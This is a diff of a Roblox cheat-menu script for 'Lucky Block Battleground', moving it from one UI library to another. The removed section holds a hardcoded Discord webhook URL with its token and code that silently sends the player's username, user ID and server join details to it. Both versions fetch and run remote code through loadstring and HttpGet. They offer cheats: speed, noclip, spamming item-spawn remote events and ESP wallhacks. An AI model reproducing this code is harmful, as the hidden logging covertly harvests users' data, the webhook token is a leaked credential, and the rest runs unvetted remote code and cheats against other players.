@@ -1,333 +1,63 @@
-local webhookURL = "https://discord.com/api/webhooks/1333133574412435467/dJtOBcbl4SuIv_2J05Ua3KS5C0y3a7SHI9D2sfVY_lEEf426Io_bt_xGNfy57mMVxl--"
+local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
+local SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/SaveManager.lua"))()
+local InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/InterfaceManager.lua"))()
+local Sense = loadstring(game:HttpGet('https://sirius.menu/sense'))()
+local Window = Fluent:CreateWindow({
+    Title = "SwirlHub - Lucky Block Battleground",
+    SubTitle = "by Flames",
+    TabWidth = 160,
+    Size = UDim2.fromOffset(600, 500),
+    Acrylic = true,
+    Theme = "Darker",
+    MinimizeKey = Enum.KeyCode.LeftControl
+})
 
-local player = game.Players.LocalPlayer
-local username = player.Name
-local displayName = player.DisplayName
-local userId = player.UserId
-local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
-local gameId = game.PlaceId
-local jobId = game.JobId
-local playerCount = #game.Players:GetPlayers()
-
-local jsJoinCode = [[
-    fetch("https://games.roblox.com/v1/games/]] .. gameId .. [[/servers/Public?sortOrder=Asc&limit=100").then(res => res.json()).then(json => {
-        const server = json.data.find(s => s.id === "]] .. jobId .. [[");
-        if (server) {
-            window.open(`roblox://placeId=` + server.placeId + `&gameInstanceId=` + server.id);
-        } else {
-            console.log("Server not found.");
-        }
-    });
-]]
-
-local luaJoinScript = [[
-local TeleportService = game:GetService("TeleportService")
-TeleportService:TeleportToPlaceInstance(]] .. gameId .. [[, "]] .. jobId .. [[", game.Players.LocalPlayer)
-]]
-
-local embed = {
-    ["title"] = "Execution Log",
-    ["description"] = "Here are the details of the player and game:",
-    ["type"] = "rich",
-    ["color"] = 0x000000, 
-    ["fields"] = {
-        { ["name"] = "Username", ["value"] = username, ["inline"] = true },
-        { ["name"] = "Display Name", ["value"] = displayName, ["inline"] = true },
-        { ["name"] = "User ID", ["value"] = tostring(userId), ["inline"] = false },
-        { ["name"] = "Game Name", ["value"] = gameName, ["inline"] = false },
-        { ["name"] = "Game ID", ["value"] = tostring(gameId), ["inline"] = true },
-        { ["name"] = "Players in Server", ["value"] = tostring(playerCount), ["inline"] = true },
-        { ["name"] = "JavaScript Join Code", ["value"] = "```js\n" .. jsJoinCode .. "\n```", ["inline"] = false },
-        { ["name"] = "Lua Join Script", ["value"] = "```lua\n" .. luaJoinScript .. "\n```", ["inline"] = false },
-    },
-    ["footer"] = { ["text"] = "Execution Log - Roblox" },
-    ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
+local Tabs = {
+    Home = Window:AddTab({ Title = "Home", Icon = "home" }),
+    Blocks = Window:AddTab({ Title = "Blocks", Icon = "square" }),
+    Player = Window:AddTab({ Title = "LocalPlayer", Icon = "user" }),
+    ESP = Window:AddTab({ Title = "ESP", Icon = "eye" })
 }
 
-local payload = game:GetService("HttpService"):JSONEncode({
-    ["content"] = "",
-    ["embeds"] = {embed}
+local Options = Fluent.Options
+
+local HomeSection = Tabs.Home:AddSection("Welcome")
+
+HomeSection:AddParagraph({
+    Title = "✨ Welcome to SwirlHub",
+    Content = "Enjoy your experience in Lucky Block Battleground! Use the tabs to access features."
 })
 
-local requestFunction = syn and syn.request or http_request or request
-if requestFunction then
-    requestFunction({
-        Url = webhookURL,
-        Method = "POST",
-        Headers = {
-            ["Content-Type"] = "application/json"
-        },
-        Body = payload
-    })
-else
-    warn("Your executor does not support HTTP requests.")
-end
-
-local Players = game:GetService("Players")
-local RunService = game:GetService("RunService")
-local TeleportService = game:GetService("TeleportService")
-
-local UserInputService = game:GetService("UserInputService")
-
-local player = Players.LocalPlayer
-local localPlayer = Players.LocalPlayer
-local placeId = game.PlaceId
-
-local CustomTheme = {
-    TextColor = Color3.fromRGB(0, 255, 0), 
-
-    Background = Color3.fromRGB(40, 40, 40), 
-    Topbar = Color3.fromRGB(20, 20, 20),  
-    Shadow = Color3.fromRGB(10, 10, 10),  
-
-    NotificationBackground = Color3.fromRGB(0, 0, 0),
-    NotificationActionsBackground = Color3.fromRGB(0, 255, 0), 
-
-    TabBackground = Color3.fromRGB(20, 20, 20),
-    TabStroke = Color3.fromRGB(0, 255, 0),
-    TabBackgroundSelected = Color3.fromRGB(0, 255, 0), 
-    TabTextColor = Color3.fromRGB(0, 255, 0),
-    SelectedTabTextColor = Color3.fromRGB(0, 0, 0), 
-
-    ElementBackground = Color3.fromRGB(15, 15, 15),
-    ElementBackgroundHover = Color3.fromRGB(20, 20, 20),
-    SecondaryElementBackground = Color3.fromRGB(10, 10, 10),
-    ElementStroke = Color3.fromRGB(0, 255, 0),
-    SecondaryElementStroke = Color3.fromRGB(0, 200, 0),
-
-    SliderBackground = Color3.fromRGB(0, 200, 0),
-    SliderProgress = Color3.fromRGB(0, 255, 0),
-    SliderStroke = Color3.fromRGB(0, 255, 0),
-
-    ToggleBackground = Color3.fromRGB(10, 10, 10),
-    ToggleEnabled = Color3.fromRGB(0, 255, 0),
-    ToggleDisabled = Color3.fromRGB(80, 80, 80),
-    ToggleEnabledStroke = Color3.fromRGB(0, 255, 0),
-    ToggleDisabledStroke = Color3.fromRGB(100, 100, 100),
-    ToggleEnabledOuterStroke = Color3.fromRGB(0, 200, 0),
-    ToggleDisabledOuterStroke = Color3.fromRGB(60, 60, 60),
-
-    DropdownSelected = Color3.fromRGB(20, 20, 20),
-    DropdownUnselected = Color3.fromRGB(10, 10, 10),
-
-    InputBackground = Color3.fromRGB(15, 15, 15),
-    InputStroke = Color3.fromRGB(0, 255, 0),
-    PlaceholderColor = Color3.fromRGB(0, 200, 0)
-}
-
-local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
-
-local Window = Rayfield:CreateWindow({
-   Name = "Flamez - Lucky Block BattleGround",
-   Icon = 0, 
-   LoadingTitle = "Flamez - Lucky Block BattleGround",
-   LoadingSubtitle = "by Flames",
-   Theme = CustomTheme, 
-
-   DisableRayfieldPrompts = false,
-   DisableBuildWarnings = false, 
-
-   ConfigurationSaving = {
-      Enabled = true,
-      FolderName = nil, 
-      FileName = "Flamez Hub"
-   },
-
-   Discord = {
-      Enabled = true, 
-      Invite = "5c9D3VD7se", 
-      RememberJoins = false 
-   },
-
-   KeySystem = false, 
-   KeySettings = {
-      Title = "Flamez - Key System",
-      Subtitle = "Key System",
-      Note = "Key is provided in the Discord", 
-      FileName = "FlamezKey", 
-      SaveKey = true, 
-      GrabKeyFromSite = false, 
-      Key = {"Hello"} 
-   }
-})
-
-local HomeTab = Window:CreateTab("Home", "home")
-local BlockTab = Window:CreateTab("Blocks", "cuboid")
-local PlayerTab = Window:CreateTab("LocalPlayer", "user")
-
-PlayerTab:CreateDivider()
-
-PlayerTab:CreateSlider({
-    Name = "WalkSpeed",
-    Range = {16, 500},
-    Increment = 1,
-    CurrentValue = 16,
-    Flag = "WalkSpeed",
-    Callback = function(Value)
-        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = Value
-    end
-})
-
-PlayerTab:CreateSlider({
-    Name = "JumpPower",
-    Range = {50, 500},
-    Increment = 1,
-    CurrentValue = 50,
-    Flag = "JumpPower",
-    Callback = function(Value)
-        game.Players.LocalPlayer.Character.Humanoid.JumpPower = Value
-    end
-})
-
-PlayerTab:CreateSlider({
-    Name = "Gravity",
-    Range = {0, 196.2},
-    Increment = 0.1,
-    CurrentValue = workspace.Gravity,
-    Flag = "Gravity",
-    Callback = function(Value)
-        workspace.Gravity = Value
-    end
-})
-
-PlayerTab:CreateSlider({
-    Name = "Field of View",
-    Range = {70, 120},
-    Increment = 1,
-    CurrentValue = 70,
-    Flag = "FOV",
-    Callback = function(Value)
-        workspace.CurrentCamera.FieldOfView = Value
-    end
-})
-
-PlayerTab:CreateDivider()
-
-PlayerTab:CreateToggle({
-    Name = "Infinite Jump",
-    CurrentValue = false,
-    Flag = "InfiniteJump",
-    Callback = function(Value)
-        _G.InfiniteJumpEnabled = Value
-    end
-})
-
-game:GetService("UserInputService").JumpRequest:Connect(function()
-    if _G.InfiniteJumpEnabled then
-        game.Players.LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
-    end
-end)
-
-PlayerTab:CreateToggle({
-    Name = "NoClip",
-    CurrentValue = false,
-    Flag = "NoClip",
-    Callback = function(Value)
-        _G.NoClipEnabled = Value
-        while _G.NoClipEnabled do
-            for _, part in ipairs(game.Players.LocalPlayer.Character:GetChildren()) do
-                if part:IsA("BasePart") then
-                    part.CanCollide = false
-                end
-            end
-            wait(0.1)
-        end
-    end
-})
-
-PlayerTab:CreateDivider()
-
-local Section = BlockTab:CreateSection("Single Open")
-
-local remoteEvents = {
-    {Name = "Spawn Diamond Block", Event = game:GetService("ReplicatedStorage").SpawnDiamondBlock},
-    {Name = "Spawn Galaxy Block", Event = game:GetService("ReplicatedStorage").SpawnGalaxyBlock},
-    {Name = "Spawn Lucky Block", Event = game:GetService("ReplicatedStorage").SpawnLuckyBlock},
-    {Name = "Spawn Rainbow Block", Event = game:GetService("ReplicatedStorage").SpawnRainbowBlock},
-    {Name = "Spawn Super Block", Event = game:GetService("ReplicatedStorage").SpawnSuperBlock},
-}
-
-for _, remote in ipairs(remoteEvents) do
-    BlockTab:CreateButton({
-        Name = remote.Name, 
-        Callback = function()
-
-            if remote.Event then
-                remote.Event:FireServer()
-            else
-                warn("Remote event for " .. remote.Name .. " not found!")
-            end
-        end,
-    })
-end
-
-local Section = BlockTab:CreateSection("Auto Open")
-
-for _, remote in ipairs(remoteEvents) do
-    local loopEnabled = false 
-
-    BlockTab:CreateToggle({
-        Name = "Auto " .. remote.Name,
-        CurrentValue = false,
-        Flag = "Loop" .. remote.Name:gsub(" ", ""), 
-        Callback = function(Value)
-            loopEnabled = Value 
-            if Value then
-
-                while loopEnabled do
-                    if remote.Event then
-                        remote.Event:FireServer()
-                    else
-                        warn("Remote event for " .. remote.Name .. " not found!")
-                    end
-                    wait(0) 
-                end
-            end
-        end,
-    })
-end
-
-HomeTab:CreateDivider()
-
-local ServerStats = HomeTab:CreateParagraph({
-    Title = "Server Statistics", 
-    Content = "Players: 0\nFPS: 0\nExecutor: Unknown"
-})
-
-HomeTab:CreateDivider()
-
-local Button = HomeTab:CreateButton({
-   Name = "Destory Flamez",
-   Callback = function()
-   Rayfield:Destroy()
-   end,
-})
-
-local RejoinButton = HomeTab:CreateButton({
-    Name = "Rejoin Server",
+HomeSection:AddButton({
+    Title = "🛑 Destroy Hub",
     Callback = function()
-
-        TeleportService:TeleportToPlaceInstance(placeId, game.JobId, player)
-    end,
+        Fluent:Destroy()
+    end
 })
 
-local ServerHopButton = HomeTab:CreateButton({
-    Name = "Server Hop",
+HomeSection:AddButton({
+    Title = "🔄 Rejoin Server",
     Callback = function()
+        game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, game.Players.LocalPlayer)
+    end
+})
 
+HomeSection:AddButton({
+    Title = "🌍 Server Hop",
+    Callback = function()
         local function hopToNewServer()
-            local httpService = game:GetService("HttpService")
+            local HttpService = game:GetService("HttpService")
             local servers = {}
             local cursor = nil
 
             repeat
-                local url = "https://games.roblox.com/v1/games/" .. placeId .. "/servers/Public?limit=100"
+                local url = "https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?limit=100"
                 if cursor then
                     url = url .. "&cursor=" .. cursor
                 end
 
                 local success, result = pcall(function()
-                    return httpService:JSONDecode(game:HttpGet(url))
+                    return HttpService:JSONDecode(game:HttpGet(url))
                 end)
 
                 if success and result and result.data then
@@ -343,61 +73,314 @@ local ServerHopButton = HomeTab:CreateButton({
             until not cursor
 
             if #servers > 0 then
-                TeleportService:TeleportToPlaceInstance(placeId, servers[math.random(1, #servers)], player)
+                game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, servers[math.random(1, #servers)], game.Players.LocalPlayer)
             else
                 warn("No available servers found.")
             end
         end
 
         hopToNewServer()
-    end,
+    end
 })
 
-HomeTab:CreateDivider()
+local BlockSection = Tabs.Blocks:AddSection("Block Spawning")
 
-local function identifyExecutor()
-    if identifyexecutor then
-        local name, version = identifyexecutor()
-        return name .. " v" .. version
-    else
-        return "Unknown"
-    end
-end
+local remoteEvents = {
+    {Name = "Diamond Block", Event = game:GetService("ReplicatedStorage").SpawnDiamondBlock},
+    {Name = "Galaxy Block", Event = game:GetService("ReplicatedStorage").SpawnGalaxyBlock},
+    {Name = "Lucky Block", Event = game:GetService("ReplicatedStorage").SpawnLuckyBlock},
+    {Name = "Rainbow Block", Event = game:GetService("ReplicatedStorage").SpawnRainbowBlock},
+    {Name = "Super Block", Event = game:GetService("ReplicatedStorage").SpawnSuperBlock},
+}
 
-local function setFPSCap(cap)
-    if setfpscap then
-        setfpscap(cap)
-        return "FPS Cap set to " .. tostring(cap)
-    else
-        return "FPS Cap Not Supported"
-    end
-end
-
-local function UpdateServerStats()
-    local playerCount = #Players:GetPlayers()
-    local fps = math.floor(1 / RunService.RenderStepped:Wait())
-    local executor = identifyExecutor()
-
-    ServerStats:Set({
-        Title = "Server Statistics", 
-        Content = "Players: " .. playerCount ..
-                  "\nFPS: " .. fps ..
-                  "\nExecutor: " .. executor
+for _, remote in ipairs(remoteEvents) do
+    BlockSection:AddButton({
+        Title = "✨ Spawn " .. remote.Name,
+        Callback = function()
+            if remote.Event then
+                remote.Event:FireServer()
+            else
+                warn("Remote event for " .. remote.Name .. " not found!")
+            end
+        end
     })
 end
 
-setFPSCap(999)
+local AutoSection = Tabs.Blocks:AddSection("Auto Spawning")
 
-while true do
-    task.wait(1)
-    UpdateServerStats()
+for _, remote in ipairs(remoteEvents) do
+    AutoSection:AddToggle("Auto" .. remote.Name:gsub(" ", ""), {
+        Title = "🔄 Auto Spawn " .. remote.Name,
+        Default = false,
+        Callback = function(Value)
+            local loopEnabled = Value
+            task.spawn(function()
+                while loopEnabled do
+                    if remote.Event then
+                        remote.Event:FireServer()
+                    end
+                    task.wait()
+                end
+            end)
+        end
+    })
 end
 
-Rayfield:Notify({
-   Title = "Script Loaded",
-   Content = "FlamezHub has been successfully loaded!",
-   Duration = 6.5, 
-   Image = "check", 
+local PlayerSection = Tabs.Player:AddSection("Player Settings")
+
+local WalkSpeedSlider = Tabs.Player:AddSlider("WalkSpeed", {
+    Title = "🏃 Walk Speed",
+    Description = "Adjust your walking speed.",
+    Min = 16,
+    Max = 500,
+    Default = 16,
+    Rounding = 1,
+    Callback = function(Value)
+        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = Value
+    end
 })
 
-Rayfield:LoadConfiguration()
+WalkSpeedSlider:OnChanged(function(Value)
+    print("Walk Speed changed to:", Value)
+end)
+
+local JumpPowerSlider = Tabs.Player:AddSlider("JumpPower", {
+    Title = "🚀 Jump Power",
+    Description = "Adjust your jump power.",
+    Min = 50,
+    Max = 500,
+    Default = 50,
+    Rounding = 1,
+    Callback = function(Value)
+        game.Players.LocalPlayer.Character.Humanoid.JumpPower = Value
+    end
+})
+
+JumpPowerSlider:OnChanged(function(Value)
+    print("Jump Power changed to:", Value)
+end)
+
+local GravitySlider = Tabs.Player:AddSlider("Gravity", {
+    Title = "🌌 Gravity",
+    Description = "Adjust the gravity.",
+    Min = 0,
+    Max = 196.2,
+    Default = workspace.Gravity,
+    Rounding = 0.1,
+    Callback = function(Value)
+        workspace.Gravity = Value
+    end
+})
+
+GravitySlider:OnChanged(function(Value)
+    print("Gravity changed to:", Value)
+end)
+
+local FieldOfViewSlider = Tabs.Player:AddSlider("FieldOfView", {
+    Title = "🎥 Field of View",
+    Description = "Adjust your camera's FOV.",
+    Min = 70,
+    Max = 120,
+    Default = 70,
+    Rounding = 1,
+    Callback = function(Value)
+        workspace.CurrentCamera.FieldOfView = Value
+    end
+})
+
+FieldOfViewSlider:OnChanged(function(Value)
+    print("Field of View changed to:", Value)
+end)
+
+PlayerSection:AddToggle("InfiniteJump", {
+    Title = "🔁 Infinite Jump",
+    Default = false,
+    Callback = function(Value)
+        _G.InfiniteJumpEnabled = Value
+    end
+})
+
+game:GetService("UserInputService").JumpRequest:Connect(function()
+    if _G.InfiniteJumpEnabled then
+        game.Players.LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+    end
+end)
+
+PlayerSection:AddToggle("NoClip", {
+    Title = "🚪 NoClip",
+    Default = false,
+    Callback = function(Value)
+        _G.NoClipEnabled = Value
+        while _G.NoClipEnabled do
+            for _, part in ipairs(game.Players.LocalPlayer.Character:GetChildren()) do
+                if part:IsA("BasePart") then
+                    part.CanCollide = false
+                end
+            end
+            task.wait(0.1)
+        end
+    end
+})
+local EnableSection = Tabs.ESP:AddSection("Enable ESP")
+
+EnableSection:AddToggle("EnableEnemyESP", {
+    Title = "👹 Enemy ESP",
+    Default = false,
+    Callback = function(Value)
+        Sense.teamSettings.enemy.enabled = Value
+    end
+})
+
+local BoxSection = Tabs.ESP:AddSection("Box ESP Settings")
+
+BoxSection:AddToggle("EnableBoxESP", {
+    Title = "📦 Box ESP",
+    Default = false,
+    Callback = function(Value)
+        Sense.teamSettings.enemy.box = Value
+    end
+})
+
+BoxSection:AddColorpicker("BoxColor", {
+    Title = "🎨 Box Color",
+    Default = Color3.new(1, 0, 0),
+    Callback = function(Value)
+        Sense.teamSettings.enemy.boxColor[1] = Value
+    end
+})
+
+BoxSection:AddToggle("EnableBoxOutline", {
+    Title = "🖍️ Box Outline",
+    Default = false,
+    Callback = function(Value)
+        Sense.teamSettings.enemy.boxOutline = Value
+    end
+})
+
+BoxSection:AddColorpicker("BoxOutlineColor", {
+    Title = "🎨 Box Outline Color",
+    Default = Color3.new(),
+    Callback = function(Value)
+        Sense.teamSettings.enemy.boxOutlineColor[1] = Value
+    end
+})
+
+BoxSection:AddToggle("EnableBoxFill", {
+    Title = "📦 Box Fill",
+    Default = false,
+    Callback = function(Value)
+        Sense.teamSettings.enemy.boxFill = Value
+    end
+})
+
+BoxSection:AddColorpicker("BoxFillColor", {
+    Title = "🎨 Box Fill Color",
+    Default = Color3.new(1, 0, 0),
+    Callback = function(Value)
+        Sense.teamSettings.enemy.boxFillColor[1] = Value
+    end
+})
+
+local HealthSection = Tabs.ESP:AddSection("Health ESP Settings")
+
+HealthSection:AddToggle("EnableHealthBar", {
+    Title = "❤️ Health Bar",
+    Default = false,
+    Callback = function(Value)
+        Sense.teamSettings.enemy.healthBar = Value
+    end
+})
+
+HealthSection:AddColorpicker("HealthyColor", {
+    Title = "💚 Healthy Color",
+    Default = Color3.new(0, 1, 0),
+    Callback = function(Value)
+        Sense.teamSettings.enemy.healthyColor = Value
+    end
+})
+
+HealthSection:AddColorpicker("DyingColor", {
+    Title = "❤️ Dying Color",
+    Default = Color3.new(1, 0, 0),
+    Callback = function(Value)
+        Sense.teamSettings.enemy.dyingColor = Value
+    end
+})
+
+HealthSection:AddToggle("EnableHealthText", {
+    Title = "📝 Health Text",
+    Default = false,
+    Callback = function(Value)
+        Sense.teamSettings.enemy.healthText = Value
+    end
+})
+
+local TracerSection = Tabs.ESP:AddSection("Tracer ESP Settings")
+
+TracerSection:AddToggle("EnableTracerESP", {
+    Title = "🔧 Tracer ESP",
+    Default = false,
+    Callback = function(Value)
+        Sense.teamSettings.enemy.tracer = Value
+    end
+})
+
+TracerSection:AddColorpicker("TracerColor", {
+    Title = "🎯 Tracer Color",
+    Default = Color3.new(1, 0, 0),
+    Callback = function(Value)
+        Sense.teamSettings.enemy.tracerColor[1] = Value
+    end
+})
+
+local ArrowSection = Tabs.ESP:AddSection("Off-Screen Arrow Settings")
+
+ArrowSection:AddToggle("EnableOffScreenArrow", {
+    Title = "➡️ Off-Screen Arrow",
+    Default = false,
+    Callback = function(Value)
+        Sense.teamSettings.enemy.offScreenArrow = Value
+    end
+})
+
+ArrowSection:AddColorpicker("OffScreenArrowColor", {
+    Title = "🎨 Arrow Color",
+    Default = Color3.new(1, 1, 1),
+    Callback = function(Value)
+        Sense.teamSettings.enemy.offScreenArrowColor[1] = Value
+    end
+})
+
+local ChamsSection = Tabs.ESP:AddSection("Chams Settings")
+
+ChamsSection:AddToggle("EnableChams", {
+    Title = "✨ Chams",
+    Default = false,
+    Callback = function(Value)
+        Sense.teamSettings.enemy.chams = Value
+    end
+})
+
+ChamsSection:AddColorpicker("ChamsFillColor", {
+    Title = "🎨 Chams Fill Color",
+    Default = Color3.new(0.2, 0.2, 0.2),
+    Callback = function(Value)
+        Sense.teamSettings.enemy.chamsFillColor[1] = Value
+    end
+})
+
+ChamsSection:AddColorpicker("ChamsOutlineColor", {
+    Title = "🎨 Chams Outline Color",
+    Default = Color3.new(1, 0, 0),
+    Callback = function(Value)
+        Sense.teamSettings.enemy.chamsOutlineColor[1] = Value
+    end
+})
+
+Sense.Load()
+
+Fluent:Notify({
+    Title = "SwirlHub",
+    Content = "Script Hub loaded successfully!",
+    Duration = 5
+})
